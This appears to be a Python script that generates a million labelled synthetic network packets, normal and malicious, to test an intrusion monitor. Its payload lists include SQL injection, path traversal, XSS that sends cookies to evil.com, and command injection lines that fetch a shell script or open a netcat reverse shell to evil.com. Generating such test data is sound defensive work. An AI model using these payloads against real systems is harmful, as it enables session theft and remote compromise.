#!/usr/bin/env python3
"""
Enhanced Packet Generator - Diverse Attack Simulation
Generates realistic variety of network threats
Usage: python3 packet_generator.py
"""

import json
import random
import time
import os
from datetime import datetime, timedelta

# ============= CONFIGURATION =============
NUM_PACKETS = 1000000  # CHANGE THIS TO ANY NUMBER YOU WANT!
OUTPUT_FILE = "packets.json"
CHUNK_SIZE = 500000

# ============= NORMAL TRAFFIC PATTERNS =============

# Source IP ranges (legitimate users)
NORMAL_IPS = [f"192.168.1.{i}" for i in range(10, 100)]
CORPORATE_IPS = [f"10.0.{i}.{j}" for i in range(1, 5) for j in range(10, 50)]
VPN_IPS = [f"172.16.{i}.{j}" for i in range(1, 3) for j in range(20, 60)]

ALL_NORMAL_IPS = NORMAL_IPS + CORPORATE_IPS + VPN_IPS

# Destination IPs (normal destinations)
NORMAL_DESTINATIONS = [
    "8.8.8.8", "8.8.4.4",           # Google DNS
    "1.1.1.1", "1.0.0.1",           # Cloudflare DNS
    "208.67.222.222", "208.67.220.220",  # OpenDNS
    "9.9.9.9",                       # Quad9
    "185.228.168.9",                 # CleanBrowsing
]

# Normal ports and services
NORMAL_PORTS = [80, 443, 53, 22, 3306, 5432, 27017, 6379, 8080, 8443]

# Normal HTTP requests
NORMAL_PAYLOADS = [
    "GET /index.html HTTP/1.1",
    "GET /css/style.css HTTP/1.1",
    "GET /js/app.js HTTP/1.1",
    "POST /api/login HTTP/1.1",
    "GET /images/logo.png HTTP/1.1",
    "GET /about.html HTTP/1.1",
    "POST /api/submit-form HTTP/1.1",
    "GET /products/search?q=laptop HTTP/1.1",
    "GET /api/user/profile HTTP/1.1",
    "POST /api/checkout HTTP/1.1",
]

# ============= ATTACKER CONFIGURATION =============

# Multiple attacker IPs (to simulate different sources)
ATTACKER_IPS = [
    "203.0.113.50",      # Primary attacker
    "203.0.113.51",      # Secondary attacker
    "198.51.100.10",     # External attacker
    "198.51.100.20",     # External attacker 2
    "192.0.2.100",       # Test network attacker
    "185.130.5.253",     # Known malicious IP
    "45.155.205.233",    # Botnet C2
]

# Target IPs (victims)
TARGET_IPS = [
    "10.0.0.1",          # Web server
    "10.0.0.5",          # Database server
    "10.0.0.10",         # Application server
    "172.16.1.100",      # Internal CRM
    "192.168.1.200",     # File server
    "10.0.0.50",         # Mail server
    "10.0.0.100",        # API gateway
]

# DDoS target pool (multiple victims)
DDOS_TARGETS = [
    "10.0.0.5",          # Primary DDoS target
    "10.0.0.10",         # Secondary target
    "172.16.1.100",      # Corporate server
    "192.168.1.200",     # Critical infrastructure
]

# ============= PORT SCAN VARIATIONS =============

# Different port scanning techniques
PORT_SCAN_TECHNIQUES = [
    "SYN scan",          # Standard SYN packet scan
    "TCP connect scan",  # Full TCP connection
    "UDP scan",          # UDP port scan
    "FIN scan",          # FIN packet scan (stealth)
    "NULL scan",         # NULL packet scan
    "XMAS scan",         # Christmas tree scan
    "ACK scan",          # ACK packet scan (bypasses firewall)
    "Window scan",       # TCP window scan
    "FTP bounce scan",   # FTP bounce attack
]

# Comprehensive port list for scanning
COMMON_PORTS = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 
                993, 995, 1433, 1521, 3306, 3389, 5432, 5900, 6379, 
                8080, 8443, 27017, 27018]

DATABASE_PORTS = [1433, 1521, 3306, 5432, 27017, 6379]
WEB_PORTS = [80, 443, 8080, 8443, 8000, 3000, 5000]
MAIL_PORTS = [25, 110, 143, 465, 587, 993, 995]
FILE_SHARE_PORTS = [21, 22, 139, 445, 2049]
REMOTE_ACCESS_PORTS = [23, 3389, 5900, 5800]

# ============= DDOS VARIATIONS =============

# DDoS attack types
DDOS_TYPES = [
    "HTTP flood",        # Layer 7 HTTP flood
    "SYN flood",         # Layer 4 SYN flood
    "UDP flood",         # UDP amplification
    "ICMP flood",        # Ping flood
    "DNS amplification", # DNS reflection
    "NTP amplification", # NTP reflection
    "Slowloris",         # Slow HTTP attack
    "HTTP pipelining",   # Request pipelining flood
]

# Botnet IP ranges (many sources)
BOTNET_IPS = [f"10.0.{i}.{j}" for i in range(100, 200) for j in range(1, 10)]
BOTNET_IPS += [f"172.16.{i}.{j}" for i in range(50, 100) for j in range(1, 20)]
BOTNET_IPS += [f"192.168.{i}.{j}" for i in range(100, 150) for j in range(1, 30)]

# DDoS payloads (with different placeholder counts)
DDOS_PAYLOADS = [
    "GET / HTTP/1.1\r\nHost: target.com\r\nUser-Agent: flooder/1.0",
    "GET /index.html?rand={} HTTP/1.1",
    "POST /login.php HTTP/1.1\r\nContent-Length: 1000000",
    "GET /largefile.zip HTTP/1.1",
    "GET /api/search?q={}&page={} HTTP/1.1",
    "HEAD / HTTP/1.1",
    "GET /slow.php?delay=10 HTTP/1.1",
    "GET /api/users?page={} HTTP/1.1",
    "POST /api/data?id={}&token={} HTTP/1.1",
]

# ============= MALICIOUS PAYLOAD VARIATIONS =============

# SQL Injection payloads
SQL_INJECTION_PAYLOADS = [
    # Basic SQL injection
    "' OR '1'='1",
    "' OR 1=1 --",
    "' OR '1'='1' /*",
    "' OR 1=1#",
    "admin' --",
    "1' OR '1'='1",
    # Union-based SQL injection
    "' UNION SELECT NULL--",
    "' UNION SELECT username, password FROM users--",
    "1' UNION SELECT 1,2,3--",
    "' UNION ALL SELECT 1,2,3,4,5--",
    # Boolean-based blind SQL
    "' AND 1=1--",
    "' AND 1=2--",
    "1' AND '1'='1",
    # Time-based blind SQL
    "'; WAITFOR DELAY '00:00:05'--",
    "1' AND SLEEP(5)--",
    "' OR SLEEP(5)='",
    # Database enumeration
    "' UNION SELECT database()--",
    "' UNION SELECT version()--",
    "' UNION SELECT user()--",
    # Data exfiltration
    "' UNION SELECT load_file('/etc/passwd')--",
    "'; EXEC xp_cmdshell('dir')--",
    "1' INTO OUTFILE '/tmp/out.txt'",
]

# XSS (Cross-Site Scripting) payloads
XSS_PAYLOADS = [
    # Basic XSS
    "<script>alert('XSS')</script>",
    "<script>alert(document.cookie)</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    # Encoded XSS
    "%3Cscript%3Ealert('XSS')%3C/script%3E",
    "&#60;script&#62;alert('XSS')&#60;/script&#62;",
    # DOM-based XSS
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<iframe src=javascript:alert('XSS')>",
    # Stealth XSS
    "<script>fetch('http://evil.com/steal?cookie='+document.cookie)</script>",
    "<script>new Image().src='http://evil.com/log?'+document.cookie</script>",
    "<script>window.location='http://evil.com/?cookie='+document.cookie</script>",
    # XSS with event handlers
    "<div onmouseover=alert('XSS')>Hover me</div>",
    "<a href='javascript:alert(1)'>Click me</a>",
]

# Command Injection payloads
CMD_INJECTION_PAYLOADS = [
    "; ls -la",
    "| cat /etc/passwd",
    "&& whoami",
    "|| id",
    "`id`",
    "$(id)",
    "; wget http://evil.com/shell.sh",
    "| nc -e /bin/sh evil.com 4444",
    "&& python -c 'import socket,subprocess,os'",
    "; echo 'malicious' > /tmp/hacked",
]

# Path Traversal payloads
PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..;/..;/..;/etc/passwd",
    "....\\\\....\\\\....\\\\boot.ini",
]

# All malicious payloads combined
ALL_MALICIOUS_PAYLOADS = (
    SQL_INJECTION_PAYLOADS + 
    XSS_PAYLOADS + 
    CMD_INJECTION_PAYLOADS + 
    PATH_TRAVERSAL_PAYLOADS
)

# ============= PACKET GENERATION FUNCTIONS =============

def generate_normal_packet(i):
    """Generate normal legitimate traffic"""
    return {
        "src_ip": random.choice(ALL_NORMAL_IPS),
        "dst_ip": random.choice(NORMAL_DESTINATIONS),
        "port": random.choice(NORMAL_PORTS),
        "payload": random.choice(NORMAL_PAYLOADS),
        "timestamp": (datetime.now() + timedelta(seconds=i*0.0001)).isoformat(),
        "malicious": False,
        "category": "normal"
    }

def generate_port_scan_packet(i, attacker_ip):
    """Generate port scan packet with various techniques"""
    technique = random.choice(PORT_SCAN_TECHNIQUES)
    
    # Choose port based on technique
    if "database" in technique.lower():
        port = random.choice(DATABASE_PORTS)
    elif "web" in technique.lower():
        port = random.choice(WEB_PORTS)
    elif "mail" in technique.lower():
        port = random.choice(MAIL_PORTS)
    else:
        port = random.choice(COMMON_PORTS)
    
    return {
        "src_ip": attacker_ip,
        "dst_ip": random.choice(TARGET_IPS),
        "port": port,
        "payload": f"{technique} on port {port} - Scanning for vulnerabilities",
        "timestamp": (datetime.now() + timedelta(seconds=i*0.0001)).isoformat(),
        "malicious": True,
        "attack_type": "port_scan",
        "technique": technique,
        "severity": "medium"
    }

def generate_ddos_packet(i):
    """Generate DDoS attack packet from botnet"""
    attack_type = random.choice(DDOS_TYPES)
    bot_ip = random.choice(BOTNET_IPS)
    target = random.choice(DDOS_TARGETS)
    
    port = 80
    payload = ""
    
    if attack_type == "HTTP flood":
        payload = random.choice(DDOS_PAYLOADS)
        # Safe placeholder handling for {}
        if '{}' in payload:
            try:
                if payload.count('{}') == 1:
                    payload = payload.format(random.randint(1, 999999))
                elif payload.count('{}') == 2:
                    payload = payload.format(random.randint(1, 999999), random.randint(1, 100))
            except (IndexError, KeyError):
                payload = "GET / HTTP/1.1\r\nHost: target.com"
        port = 80
        
    elif attack_type == "SYN flood":
        payload = f"SYN packet - Seq: {random.randint(1000, 999999)}"
        port = random.choice([80, 443, 22, 3389])
        
    elif attack_type == "UDP flood":
        payload = f"UDP packet - Length: {random.randint(100, 65535)}"
        port = random.choice([53, 123, 161, 500])
        
    elif attack_type == "ICMP flood":
        payload = f"ICMP Echo Request - ID: {random.randint(1, 65535)}"
        port = 0
        
    elif attack_type == "DNS amplification":
        payload = f"DNS query for example.com - TXT record request (amplified)"
        port = 53
        
    elif attack_type == "NTP amplification":
        payload = f"NTP monlist request - Amplification attack"
        port = 123
        
    elif attack_type == "Slowloris":
        payload = f"GET / HTTP/1.1\r\nHost: target.com\r\nX-Custom-Header: {random.randint(1, 999999)}"
        port = 80
        
    else:  # HTTP pipelining or default
        payload = f"{attack_type} attack packet"
        port = random.choice([80, 443, 8080])
    
    return {
        "src_ip": bot_ip,
        "dst_ip": target,
        "port": port,
        "payload": payload,
        "timestamp": (datetime.now() + timedelta(seconds=i*0.0001)).isoformat(),
        "malicious": True,
        "attack_type": "ddos",
        "ddos_type": attack_type,
        "severity": "high"
    }

def generate_malicious_payload_packet(i):
    """Generate packet with various malicious payloads"""
    # 40% SQL injection, 35% XSS, 15% command injection, 10% path traversal
    rand = random.random()
    
    if rand < 0.40:
        payload = random.choice(SQL_INJECTION_PAYLOADS)
        attack_subtype = "sql_injection"
    elif rand < 0.75:
        payload = random.choice(XSS_PAYLOADS)
        attack_subtype = "xss"
    elif rand < 0.90:
        payload = random.choice(CMD_INJECTION_PAYLOADS)
        attack_subtype = "command_injection"
    else:
        payload = random.choice(PATH_TRAVERSAL_PAYLOADS)
        attack_subtype = "path_traversal"
    
    return {
        "src_ip": random.choice(ALL_NORMAL_IPS + ATTACKER_IPS),
        "dst_ip": random.choice(TARGET_IPS),
        "port": random.choice(WEB_PORTS + DATABASE_PORTS),
        "payload": payload,
        "timestamp": (datetime.now() + timedelta(seconds=i*0.0001)).isoformat(),
        "malicious": True,
        "attack_type": "malicious_payload",
        "payload_type": attack_subtype,
        "severity": "critical" if attack_subtype in ["sql_injection", "command_injection"] else "high"
    }

def generate_advanced_attack_packet(i):
    """Generate advanced multi-stage attack packets"""
    attack_sequence = [
        "reconnaissance",
        "initial_access", 
        "privilege_escalation",
        "lateral_movement",
        "data_exfiltration"
    ]
    
    step = random.choice(attack_sequence)
    
    if step == "reconnaissance":
        return generate_port_scan_packet(i, random.choice(ATTACKER_IPS))
    elif step == "initial_access":
        return generate_malicious_payload_packet(i)
    elif step == "privilege_escalation":
        return {
            "src_ip": random.choice(ATTACKER_IPS),
            "dst_ip": random.choice(TARGET_IPS),
            "port": random.choice([22, 3389, 5985]),
            "payload": f"sudo -u root /bin/bash - Privilege escalation attempt",
            "timestamp": (datetime.now() + timedelta(seconds=i*0.0001)).isoformat(),
            "malicious": True,
            "attack_type": "privilege_escalation",
            "severity": "critical"
        }
    elif step == "lateral_movement":
        return {
            "src_ip": random.choice(TARGET_IPS),
            "dst_ip": random.choice([ip for ip in TARGET_IPS if ip != "10.0.0.5"]),
            "port": random.choice([22, 445, 3389]),
            "payload": f"SSH key extraction - Lateral movement attempt",
            "timestamp": (datetime.now() + timedelta(seconds=i*0.0001)).isoformat(),
            "malicious": True,
            "attack_type": "lateral_movement",
            "severity": "critical"
        }
    else:  # data_exfiltration
        return {
            "src_ip": random.choice(TARGET_IPS),
            "dst_ip": random.choice(["185.130.5.253", "45.155.205.233", "198.51.100.20"]),
            "port": 443,
            "payload": f"POST /upload HTTP/1.1\nContent-Length: 1000000\n\n[ENCRYPTED_DATA]",
            "timestamp": (datetime.now() + timedelta(seconds=i*0.0001)).isoformat(),
            "malicious": True,
            "attack_type": "data_exfiltration",
            "severity": "critical"
        }

def generate_packet(i):
    """Main packet generation logic with diverse attacks"""
    
    # Traffic distribution
    rand = random.random()
    
    if rand < 0.75:  # 75% normal traffic
        return generate_normal_packet(i)
    elif rand < 0.80:  # 5% port scans
        attacker = random.choice(ATTACKER_IPS)
        return generate_port_scan_packet(i, attacker)
    elif rand < 0.85:  # 5% DDoS attacks
        return generate_ddos_packet(i)
    elif rand < 0.92:  # 7% malicious payloads
        return generate_malicious_payload_packet(i)
    else:  # 3% advanced attacks
        return generate_advanced_attack_packet(i)

# ============= MAIN GENERATION FUNCTION =============

def main():
    print("=" * 70)
    print("ENHANCED PACKET GENERATOR - DIVERSE ATTACK SIMULATION")
    print("=" * 70)
    print(f"\n📊 Configuration:")
    print(f"   Total packets: {NUM_PACKETS:,}")
    print(f"   Output file: {OUTPUT_FILE}")
    print(f"\n🎯 Attack Types Included:")
    print(f"   • Port Scans: {len(PORT_SCAN_TECHNIQUES)} techniques")
    print(f"   • DDoS Attacks: {len(DDOS_TYPES)} types")
    print(f"   • SQL Injection: {len(SQL_INJECTION_PAYLOADS)} variants")
    print(f"   • XSS Attacks: {len(XSS_PAYLOADS)} variants")
    print(f"   • Command Injection: {len(CMD_INJECTION_PAYLOADS)} variants")
    print(f"   • Path Traversal: {len(PATH_TRAVERSAL_PAYLOADS)} variants")
    print(f"   • Advanced Multi-stage Attacks")
    print(f"\n🌐 Network Configuration:")
    print(f"   • Normal IPs: {len(ALL_NORMAL_IPS)}")
    print(f"   • Attacker IPs: {len(ATTACKER_IPS)}")
    print(f"   • Botnet IPs: {len(BOTNET_IPS)}")
    print(f"   • Target IPs: {len(TARGET_IPS)}")
    
    start_time = time.time()
    
    # Counters for statistics
    stats = {
        "normal": 0,
        "port_scan": 0,
        "ddos": 0,
        "malicious_payload": 0,
        "advanced": 0
    }
    
    with open(OUTPUT_FILE, "w") as f:
        f.write("[")
        
        for i in range(NUM_PACKETS):
            packet = generate_packet(i)
            
            # Update stats
            if not packet.get("malicious"):
                stats["normal"] += 1
            else:
                attack_type = packet.get("attack_type", "unknown")
                if attack_type == "port_scan":
                    stats["port_scan"] += 1
                elif attack_type == "ddos":
                    stats["ddos"] += 1
                elif attack_type in ["malicious_payload", "sql_injection", "xss", "command_injection", "path_traversal"]:
                    stats["malicious_payload"] += 1
                else:
                    stats["advanced"] += 1
            
            json.dump(packet, f)
            
            if i < NUM_PACKETS - 1:
                f.write(",")
            f.write("\n")
            
            # Progress indicator
            if (i + 1) % 100000 == 0:
                print(f"  Generated {i + 1:,}/{NUM_PACKETS:,} packets...")
        
        f.write("]")
    
    elapsed = time.time() - start_time
    file_size = os.path.getsize(OUTPUT_FILE) / (1024**2)
    
    print("\n" + "=" * 70)
    print("✅ GENERATION COMPLETE!")
    print("=" * 70)
    print(f"\n📁 File Information:")
    print(f"   File: {OUTPUT_FILE}")
    print(f"   Size: {file_size:.2f} MB")
    print(f"   Time: {elapsed:.2f} seconds")
    
    print(f"\n📊 Traffic Statistics:")
    print(f"   Normal traffic: {stats['normal']:,} ({stats['normal']/NUM_PACKETS*100:.1f}%)")
    print(f"   Port scans: {stats['port_scan']:,} ({stats['port_scan']/NUM_PACKETS*100:.1f}%)")
    print(f"   DDoS attacks: {stats['ddos']:,} ({stats['ddos']/NUM_PACKETS*100:.1f}%)")
    print(f"   Malicious payloads: {stats['malicious_payload']:,} ({stats['malicious_payload']/NUM_PACKETS*100:.1f}%)")
    print(f"   Advanced attacks: {stats['advanced']:,} ({stats['advanced']/NUM_PACKETS*100:.1f}%)")
    
    print(f"\n🎯 Attack Diversity:")
    print(f"   • Port scan techniques: {len(PORT_SCAN_TECHNIQUES)}")
    print(f"   • DDoS types: {len(DDOS_TYPES)}")
    print(f"   • SQL injection variants: {len(SQL_INJECTION_PAYLOADS)}")
    print(f"   • XSS variants: {len(XSS_PAYLOADS)}")
    print(f"   • Command injection: {len(CMD_INJECTION_PAYLOADS)}")
    print(f"   • Path traversal: {len(PATH_TRAVERSAL_PAYLOADS)}")
    
    print(f"\n🚀 Next step:")
    print(f"   python3 monitor.py")

if __name__ == "__main__":
    main()